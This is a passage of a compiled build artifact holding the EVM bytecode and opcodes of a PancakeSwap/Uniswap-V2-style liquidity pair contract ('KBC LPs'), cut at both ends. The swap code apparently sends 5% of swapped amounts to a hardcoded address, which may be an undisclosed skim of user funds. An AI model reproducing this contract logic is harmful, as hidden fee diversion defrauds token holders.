d576000612241610fc46001600160701b0388811690881663ffffffff611e0316565b9050600061224e836122f6565b9050808211156122da5760006122816008610b47612272868663ffffffff611e6616565b6000549063ffffffff611e0316565b905060006122b661229984600863ffffffff611e0316565b6122aa86601163ffffffff611e0316565b9063ffffffff61258d16565b905060008183816122c357fe5b04905080156122d6576122d68782612348565b5050505b50505b6122ee565b80156122ee576000600e555b505092915050565b60006003821115612339575080600160028204015b818110156123335780915060028182858161232257fe5b04018161232b57fe5b04905061230b565b50612343565b8115612343575060015b919050565b60005461235b908263ffffffff61258d16565b60009081556001600160a01b038316815260016020526040902054612386908263ffffffff61258d16565b6001600160a01b038316600081815260016020908152604080832094909455835185815293519293919260008051602061264d8339815191529281900390910190a35050565b60008183106123db57816123dd565b825b9392505050565b6001600160a01b03821660009081526001602052604090205461240d908263ffffffff611e6616565b6001600160a01b0383166000908152600160205260408120919091555461243a908263ffffffff611e6616565b60009081556040805183815290516001600160a01b0385169160008051602061264d833981519152919081900360200190a35050565b60006001600160a01b0383166124cd576040805162461bcd60e51b815260206004820152601f60248201527f42455032303a206d696e7420746f20746865207a65726f206164647265737300604482015290519081900360640190fd5b6000546124e0908363ffffffff61258d16565b60009081556001600160a01b03841681526003602052604090205461250b908363ffffffff61258d16565b6001600160a01b038416600081815260036020908152604080832094909455835186815293519293919260008051602061264d8339815191529281900390910190a350600192915050565b6001600160701b0316600160701b0290565b60006001600160701b0382166001600160e01b0384168161258557fe5b049392505050565b80820182811015610c75576040805162461bcd60e51b815260206004820152601460248201527364732d6d6174682d6164642d6f766572666c6f7760601b604482015290519081900360640190fdfe50616e63616b653a20494e53554646494349454e545f494e5055545f414d4f554e54556e697377617056323a20494e53554646494349454e545f4c49515549444954595f4d494e54454450616e63616b653a20494e53554646494349454e545f4c49515549444954595f4255524e4544ddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef50616e63616b653a20494e53554646494349454e545f4f55545055545f414d4f554e5450616e63616b653a20494e53554646494349454e545f4c49515549444954595f4d494e544544a265627a7a72315820fa4b361cdd6daa0da2a7850e045553687791240905a83c39dd556167998e768b64736f6c63430005100032454950373132446f6d61696e28737472696e67206e616d652c737472696e672076657273696f6e2c75696e7432353620636861696e49642c6164647265737320766572696679696e67436f6e747261637429",
					"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x6 DUP1 SLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB NOT AND PUSH20 0x358BB1515A41A803AD950D3A0D22B914093DDB80 OR SWAP1 SSTORE PUSH1 0x1 PUSH1 0xF SSTORE CALLVALUE DUP1 ISZERO PUSH2 0x3B JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x40 MLOAD CHAINID SWAP1 DUP1 PUSH1 0x52 PUSH2 0x280F DUP3 CODECOPY PUSH1 0x40 DUP1 MLOAD SWAP2 DUP3 SWAP1 SUB PUSH1 0x52 ADD DUP3 KECCAK256 DUP3 DUP3 ADD DUP3 MSTORE PUSH1 0x7 DUP1 DUP5 MSTORE PUSH7 0x4B4243204C5073 PUSH1 0xC8 SHL PUSH1 0x20 SWAP5 DUP6 ADD MSTORE DUP3 MLOAD DUP1 DUP5 ADD DUP5 MSTORE PUSH1 0x1 DUP2 MSTORE PUSH1 0x31 PUSH1 0xF8 SHL SWAP1 DUP6 ADD MSTORE DUP3 MLOAD DUP1 DUP6 ADD SWAP3 SWAP1 SWAP3 MSTORE PUSH32 0x6A36D39F32C2225411D16C8F56813B9117E6EB8BF3D2893C5FC62411565CFCFE DUP3 DUP5 ADD MSTORE PUSH32 0xC89EFDAA54C0F20C7ADF612882DF0950F5A951637E0307CDCB4C672F298B8BC6 PUSH1 0x60 DUP4 ADD MSTORE PUSH1 0x80 DUP3 ADD SWAP6 SWAP1 SWAP6 MSTORE ADDRESS PUSH1 0xA0 DUP1 DUP4 ADD SWAP2 SWAP1 SWAP2 MSTORE DUP3 MLOAD DUP1 DUP4 SUB SWAP1 SWAP2 ADD DUP2 MSTORE PUSH1 0xC0 SWAP1 SWAP2 ADD SWAP1 SWAP2 MSTORE DUP1 MLOAD SWAP2 ADD KECCAK256 PUSH1 0x4 SSTORE POP DUP1 SLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB NOT AND CALLER OR SWAP1 SSTORE PUSH2 0x26EA DUP1 PUSH2 0x125 PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH2 0x1E5 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x70A08231 GT PUSH2 0x10F JUMPI DUP1 PUSH4 0xBC25CF77 GT PUSH2 0xA2 JUMPI DUP1 PUSH4 0xDCBBB373 GT PUSH2 0x71 JUMPI DUP1 PUSH4 0xDCBBB373 EQ PUSH2 0x5FF JUMPI DUP1 PUSH4 0xDD62ED3E EQ PUSH2 0x625 JUMPI DUP1 PUSH4 0xF317739C EQ PUSH2 0x653 JUMPI DUP1 PUSH4 0xFFF6CAE9 EQ PUSH2 0x65B JUMPI PUSH2 0x1E5 JUMP JUMPDEST DUP1 PUSH4 0xBC25CF77 EQ PUSH2 0x578 JUMPI DUP1 PUSH4 0xC45A0155 EQ PUSH2 0x59E JUMPI DUP1 PUSH4 0xD21220A7 EQ PUSH2 0x5A6 JUMPI DUP1 PUSH4 0xD505ACCF EQ PUSH2 0x5AE JUMPI PUSH2 0x1E5 JUMP JUMPDEST DUP1 PUSH4 0x900820D8 GT PUSH2 0xDE JUMPI DUP1 PUSH4 0x900820D8 EQ PUSH2 0x534 JUMPI DUP1 PUSH4 0x95D89B41 EQ PUSH2 0x53C JUMPI DUP1 PUSH4 0xA9059CBB EQ PUSH2 0x544 JUMPI DUP1 PUSH4 0xBA9A7A56 EQ PUSH2 0x570 JUMPI PUSH2 0x1E5 JUMP JUMPDEST DUP1 PUSH4 0x70A08231 EQ PUSH2 0x4A1 JUMPI DUP1 PUSH4 0x7464FC3D EQ PUSH2 0x4C7 JUMPI DUP1 PUSH4 0x7ECEBE00 EQ PUSH2 0x4CF JUMPI DUP1 PUSH4 0x89AFCB44 EQ PUSH2 0x4F5 JUMPI PUSH2 0x1E5 JUMP JUMPDEST DUP1 PUSH4 0x23B872DD GT PUSH2 0x187 JUMPI DUP1 PUSH4 0x47D5D856 GT PUSH2 0x156 JUMPI DUP1 PUSH4 0x47D5D856 EQ PUSH2 0x445 JUMPI DUP1 PUSH4 0x5909C0D5 EQ PUSH2 0x46B JUMPI DUP1 PUSH4 0x5A3D5493 EQ PUSH2 0x473 JUMPI DUP1 PUSH4 0x6A627842 EQ PUSH2 0x47B JUMPI PUSH2 0x1E5 JUMP JUMPDEST DUP1 PUSH4 0x23B872DD EQ PUSH2 0x3E1 JUMPI DUP1 PUSH4 0x30ADF81F EQ PUSH2 0x417 JUMPI DUP1 PUSH4 0x313CE567 EQ PUSH2 0x41F JUMPI DUP1 PUSH4 0x3644E515 EQ PUSH2 0x43D JUMPI PUSH2 0x1E5 JUMP JUMPDEST DUP1 PUSH4 0x95EA7B3 GT PUSH2 0x1C3 JUMPI DUP1 PUSH4 0x95EA7B3 EQ PUSH2 0x32D JUMPI DUP1 PUSH4 0xDFE1681 EQ PUSH2 0x36D JUMPI DUP1 PUSH4 0x1794BB3C EQ PUSH2 0x391 JUMPI DUP1 PUSH4 0x18160DDD EQ PUSH2 0x3C7 JUMPI PUSH2 0x1E5 JUMP JUMPDEST DUP1 PUSH4 0x22C0D9F EQ PUSH2 0x1EA JUMPI DUP1 PUSH4 0x6FDDE03 EQ PUSH2 0x278 JUMPI DUP1 PUSH4 0x902F1AC EQ PUSH2 0x2F5 JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x276 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x80 DUP2 LT ISZERO PUSH2 0x200 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 CALLDATALOAD SWAP2 PUSH1 0x20 DUP2 ADD CALLDATALOAD SWAP2 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB PUSH1 0x40 DUP4 ADD CALLDATALOAD AND SWAP2 SWAP1 DUP2 ADD SWAP1 PUSH1 0x80 DUP2 ADD PUSH1 0x60 DUP3 ADD CALLDATALOAD PUSH5 0x100000000 DUP2 GT ISZERO PUSH2 0x237 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP3 ADD DUP4 PUSH1 0x20 DUP3 ADD GT ISZERO PUSH2 0x249 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP1 CALLDATALOAD SWAP1 PUSH1 0x20 ADD SWAP2 DUP5 PUSH1 0x1 DUP4 MUL DUP5 ADD GT PUSH5 0x100000000 DUP4 GT OR ISZERO PUSH2 0x26B JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP SWAP1 SWAP3 POP SWAP1 POP PUSH2 0x663 JUMP JUMPDEST STOP JUMPDEST PUSH2 0x280 PUSH2 0xC17 JUMP JUMPDEST PUSH1 0x40 DUP1 MLOAD PUSH1 0x20 DUP1 DUP3 MSTORE DUP4 MLOAD DUP2 DUP4 ADD MSTORE DUP4 MLOAD SWAP2 SWAP3 DUP4 SWAP3 SWAP1 DUP4 ADD SWAP2 DUP6 ADD SWAP1 DUP1 DUP4 DUP4 PUSH1 0x0 JUMPDEST DUP4 DUP2 LT ISZERO PUSH2 0x2BA JUMPI DUP2 DUP2 ADD MLOAD DUP4 DUP3 ADD MSTORE PUSH1 0x20 ADD PUSH2 0x2A2 JUMP JUMPDEST POP POP POP POP SWAP1 POP SWAP1 DUP2 ADD SWAP1 PUSH1 0x1F AND DUP1 ISZERO PUSH2 0x2E7 JUMPI DUP1 DUP3 SUB DUP1 MLOAD PUSH1 0x1 DUP4 PUSH1 0x20 SUB PUSH2 0x100 EXP SUB NOT AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP JUMPDEST POP SWAP3 POP POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x2FD PUSH2 0xC3A JUMP JUMPDEST PUSH1 0x40 DUP1 MLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB SWAP5 DUP6 AND DUP2 MSTORE SWAP3 SWAP1 SWAP4 AND PUSH1 0x20 DUP4 ADD MSTORE PUSH4 0xFFFFFFFF AND DUP2 DUP4 ADD MSTORE SWAP1 MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x60 ADD SWAP1 RETURN JUMPDEST PUSH2 0x359 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x40 DUP2 LT ISZERO PUSH2 0x343 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP2 CALLDATALOAD AND SWAP1 PUSH1 0x20 ADD CALLDATALOAD PUSH2 0xC64 JUMP JUMPDEST PUSH1 0x40 DUP1 MLOAD SWAP2 ISZERO ISZERO DUP3 MSTORE MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x20 ADD SWAP1 RETURN JUMPDEST PUSH2 0x375 PUSH2 0xC7B JUMP JUMPDEST PUSH1 0x40 DUP1 MLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP1 SWAP3 AND DUP3 MSTORE MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x20 ADD SWAP1 RETURN JUMPDEST PUSH2 0x276 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x60 DUP2 LT ISZERO PUSH2 0x3A7 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP2 CALLDATALOAD DUP2 AND SWAP2 PUSH1 0x20 DUP2 ADD CALLDATALOAD SWAP1 SWAP2 AND SWAP1 PUSH1 0x40 ADD CALLDATALOAD PUSH2 0xC8A JUMP JUMPDEST PUSH2 0x3CF PUSH2 0xD13 JUMP JUMPDEST PUSH1 0x40 DUP1 MLOAD SWAP2 DUP3 MSTORE MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x20 ADD SWAP1 RETURN JUMPDEST PUSH2 0x359 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x60 DUP2 LT ISZERO PUSH2 0x3F7 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP2 CALLDATALOAD DUP2 AND SWAP2 PUSH1 0x20 DUP2 ADD CALLDATALOAD SWAP1 SWAP2 AND SWAP1 PUSH1 0x40 ADD CALLDATALOAD PUSH2 0xD19 JUMP JUMPDEST PUSH2 0x3CF PUSH2 0xDB3 JUMP JUMPDEST PUSH2 0x427 PUSH2 0xDD7 JUMP JUMPDEST PUSH1 0x40 DUP1 MLOAD PUSH1 0xFF SWAP1 SWAP3 AND DUP3 MSTORE MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x20 ADD SWAP1 RETURN JUMPDEST PUSH2 0x3CF PUSH2 0xDDC JUMP JUMPDEST PUSH2 0x3CF PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x45B JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP CALLDATALOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND PUSH2 0xDE2 JUMP JUMPDEST PUSH2 0x3CF PUSH2 0xDF4 JUMP JUMPDEST PUSH2 0x3CF PUSH2 0xDFA JUMP JUMPDEST PUSH2 0x3CF PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x491 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP CALLDATALOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND PUSH2 0xE00 JUMP JUMPDEST PUSH2 0x3CF PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x4B7 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP CALLDATALOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND PUSH2 0x10FE JUMP JUMPDEST PUSH2 0x3CF PUSH2 0x1110 JUMP JUMPDEST PUSH2 0x3CF PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x4E5 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP CALLDATALOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND PUSH2 0x1116 JUMP JUMPDEST PUSH2 0x51B PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x50B JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP CALLDATALOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND PUSH2 0x1128 JUMP JUMPDEST PUSH1 0x40 DUP1 MLOAD SWAP3 DUP4 MSTORE PUSH1 0x20 DUP4 ADD SWAP2 SWAP1 SWAP2 MSTORE DUP1 MLOAD SWAP2 DUP3 SWAP1 SUB ADD SWAP1 RETURN JUMPDEST PUSH2 0x375 PUSH2 0x14CC JUMP JUMPDEST PUSH2 0x280 PUSH2 0x14DB JUMP JUMPDEST PUSH2 0x359 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x40 DUP2 LT ISZERO PUSH2 0x55A JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP2 CALLDATALOAD AND SWAP1 PUSH1 0x20 ADD CALLDATALOAD PUSH2 0x14FD JUMP JUMPDEST PUSH2 0x3CF PUSH2 0x150A JUMP JUMPDEST PUSH2 0x276 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x58E JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP CALLDATALOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND PUSH2 0x1510 JUMP JUMPDEST PUSH2 0x375 PUSH2 0x1679 JUMP JUMPDEST PUSH2 0x375 PUSH2 0x1688 JUMP JUMPDEST PUSH2 0x276 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0xE0 DUP2 LT ISZERO PUSH2 0x5C4 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP2 CALLDATALOAD DUP2 AND SWAP2 PUSH1 0x20 DUP2 ADD CALLDATALOAD SWAP1 SWAP2 AND SWAP1 PUSH1 0x40 DUP2 ADD CALLDATALOAD SWAP1 PUSH1 0x60 DUP2 ADD CALLDATALOAD SWAP1 PUSH1 0xFF PUSH1 0x80 DUP3 ADD CALLDATALOAD AND SWAP1 PUSH1 0xA0 DUP2 ADD CALLDATALOAD SWAP1 PUSH1 0xC0 ADD CALLDATALOAD PUSH2 0x1697 JUMP JUMPDEST PUSH2 0x3CF PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x615 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP CALLDATALOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND PUSH2 0x1897 JUMP JUMPDEST PUSH2 0x3CF PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x40 DUP2 LT ISZERO PUSH2 0x63B JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP2 CALLDATALOAD DUP2 AND SWAP2 PUSH1 0x20 ADD CALLDATALOAD AND PUSH2 0x1AE6 JUMP JUMPDEST PUSH2 0x3CF PUSH2 0x1B03 JUMP JUMPDEST PUSH2 0x276 PUSH2 0x1B09 JUMP JUMPDEST PUSH1 0xF SLOAD PUSH1 0x1 EQ PUSH2 0x6AC JUMPI PUSH1 0x40 DUP1 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0xF PUSH1 0x24 DUP3 ADD MSTORE PUSH15 0x14185B98D85AD94E881313D0D2D151 PUSH1 0x8A SHL PUSH1 0x44 DUP3 ADD MSTORE SWAP1 MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x64 ADD SWAP1 REVERT JUMPDEST PUSH1 0x0 PUSH1 0xF SSTORE DUP5 ISZERO ISZERO DUP1 PUSH2 0x6BF JUMPI POP PUSH1 0x0 DUP5 GT JUMPDEST PUSH2 0x6FA JUMPI PUSH1 0x40 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE PUSH1 0x23 DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH2 0x266D PUSH1 0x23 SWAP2 CODECOPY PUSH1 0x40 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH1 0x0 DUP1 PUSH2 0x705 PUSH2 0xC3A JUMP JUMPDEST POP SWAP2 POP SWAP2 POP DUP2 PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB AND DUP8 LT DUP1 ISZERO PUSH2 0x72A JUMPI POP DUP1 PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB AND DUP7 LT JUMPDEST PUSH2 0x77B JUMPI PUSH1 0x40 DUP1 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x1F PUSH1 0x24 DUP3 ADD MSTORE PUSH32 0x50616E63616B653A20494E53554646494349454E545F4C495155494449545900 PUSH1 0x44 DUP3 ADD MSTORE SWAP1 MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x64 ADD SWAP1 REVERT JUMPDEST PUSH1 0x0 DUP1 DUP1 PUSH1 0x64 PUSH1 0x5 DUP12 MUL DIV DUP11 SUB SWAP1 POP PUSH1 0x0 PUSH1 0x64 PUSH1 0x5 DUP12 MUL PUSH1 0x8 SLOAD PUSH1 0x9 SLOAD SWAP3 SWAP1 SWAP2 DIV DUP13 SUB SWAP3 POP PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP1 DUP2 AND SWAP2 DUP2 AND SWAP1 DUP12 AND DUP3 EQ DUP1 ISZERO SWAP1 PUSH2 0x7D2 JUMPI POP DUP1 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND DUP12 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND EQ ISZERO JUMPDEST PUSH2 0x819 JUMPI PUSH1 0x40 DUP1 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x13 PUSH1 0x24 DUP3 ADD MSTORE PUSH19 0x50616E63616B653A20494E56414C49445F544F PUSH1 0x68 SHL PUSH1 0x44 DUP3 ADD MSTORE SWAP1 MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x64 ADD SWAP1 REVERT JUMPDEST DUP13 ISZERO PUSH2 0x82A JUMPI PUSH2 0x82A DUP3 DUP13 DUP7 PUSH2 0x1C69 JUMP JUMPDEST DUP12 ISZERO PUSH2 0x83B JUMPI PUSH2 0x83B DUP2 DUP13 DUP6 PUSH2 0x1C69 JUMP JUMPDEST DUP9 ISZERO PUSH2 0x8F6 JUMPI DUP11 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND PUSH4 0x84800812 CALLER DUP7 DUP7 DUP15 DUP15 PUSH1 0x40 MLOAD DUP7 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP7 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND DUP2 MSTORE PUSH1 0x20 ADD DUP6 DUP2 MSTORE PUSH1 0x20 ADD DUP5 DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE DUP5 DUP5 DUP3 DUP2 DUP2 MSTORE PUSH1 0x20 ADD SWAP3 POP DUP1 DUP3 DUP5 CALLDATACOPY PUSH1 0x0 DUP2 DUP5 ADD MSTORE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND SWAP1 POP DUP1 DUP4 ADD SWAP3 POP POP POP SWAP7 POP POP POP POP POP POP POP PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x8DD JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x8F1 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP JUMPDEST PUSH1 0x64 PUSH1 0x5 DUP15 DUP2 MUL DUP3 SWAP1 DIV SWAP2 SWAP1 DUP15 MUL DIV DUP15 ISZERO PUSH2 0x923 JUMPI PUSH1 0x6 SLOAD PUSH2 0x923 SWAP1 DUP6 SWAP1 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND DUP5 PUSH2 0x1C69 JUMP JUMPDEST DUP14 ISZERO PUSH2 0x941 JUMPI PUSH1 0x6 SLOAD PUSH2 0x941 SWAP1 DUP5 SWAP1 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND DUP4 PUSH2 0x1C69 JUMP JUMPDEST PUSH1 0x40 DUP1 MLOAD PUSH4 0x70A08231 PUSH1 0xE0 SHL DUP2 MSTORE ADDRESS PUSH1 0x4 DUP3 ADD MSTORE SWAP1 MLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP7 AND SWAP2 PUSH4 0x70A08231 SWAP2 PUSH1 0x24 DUP1 DUP4 ADD SWAP3 PUSH1 0x20 SWAP3 SWAP2 SWAP1 DUP3 SWAP1 SUB ADD DUP2 DUP7 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x987 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x99B JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x9B1 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP MLOAD PUSH1 0x40 DUP1 MLOAD PUSH4 0x70A08231 PUSH1 0xE0 SHL DUP2 MSTORE ADDRESS PUSH1 0x4 DUP3 ADD MSTORE SWAP1 MLOAD SWAP2 SWAP10 POP PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP6 AND SWAP2 PUSH4 0x70A08231 SWAP2 PUSH1 0x24 DUP1 DUP3 ADD SWAP3 PUSH1 0x20 SWAP3 SWAP1 SWAP2 SWAP1 DUP3 SWAP1 SUB ADD DUP2 DUP7 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x9FD JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0xA11 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x20 DUP2 LT ISZERO PUSH2 0xA27 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP MLOAD SWAP7 POP PUSH1 0x0 SWAP6 POP POP POP POP POP POP PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB DUP6 AND DUP11 SWAP1 SUB DUP4 GT PUSH2 0xA4E JUMPI PUSH1 0x0 PUSH2 0xA5D JUMP JUMPDEST DUP10 DUP6 PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB AND SUB DUP4 SUB JUMPDEST SWAP1 POP PUSH1 0x0 DUP10 DUP6 PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB AND SUB DUP4 GT PUSH2 0xA7A JUMPI PUSH1 0x0 PUSH2 0xA89 JUMP JUMPDEST DUP10 DUP6 PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB AND SUB DUP4 SUB JUMPDEST SWAP1 POP PUSH1 0x0 DUP3 GT DUP1 PUSH2 0xA9A JUMPI POP PUSH1 0x0 DUP2 GT JUMPDEST PUSH2 0xAD5 JUMPI PUSH1 0x40 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE PUSH1 0x22 DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH2 0x25DD PUSH1 0x22 SWAP2 CODECOPY PUSH1 0x40 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH1 0x0 PUSH2 0xB09 PUSH2 0xAEB DUP5 PUSH1 0x19 PUSH4 0xFFFFFFFF PUSH2 0x1E03 AND JUMP JUMPDEST PUSH2 0xAFD DUP8 PUSH2 0x2710 PUSH4 0xFFFFFFFF PUSH2 0x1E03 AND JUMP JUMPDEST SWAP1 PUSH4 0xFFFFFFFF PUSH2 0x1E66 AND JUMP JUMPDEST SWAP1 POP PUSH1 0x0 PUSH2 0xB21 PUSH2 0xAEB DUP5 PUSH1 0x19 PUSH4 0xFFFFFFFF PUSH2 0x1E03 AND JUMP JUMPDEST SWAP1 POP PUSH2 0xB53 PUSH4 0x5F5E100 PUSH2 0xB47 PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB DUP12 DUP2 AND SWAP1 DUP12 AND PUSH4 0xFFFFFFFF PUSH2 0x1E03 AND JUMP JUMPDEST SWAP1 PUSH4 0xFFFFFFFF PUSH2 0x1E03 AND JUMP JUMPDEST PUSH2 0xB63 DUP4 DUP4 PUSH4 0xFFFFFFFF PUSH2 0x1E03 AND JUMP JUMPDEST LT ISZERO PUSH2 0xBA3 JUMPI PUSH1 0x40 DUP1 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0xA PUSH1 0x24 DUP3 ADD MSTORE PUSH10 0x50616E63616B653A204B PUSH1 0xB0 SHL PUSH1 0x44 DUP3 ADD MSTORE SWAP1 MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x64 ADD SWAP1 REVERT 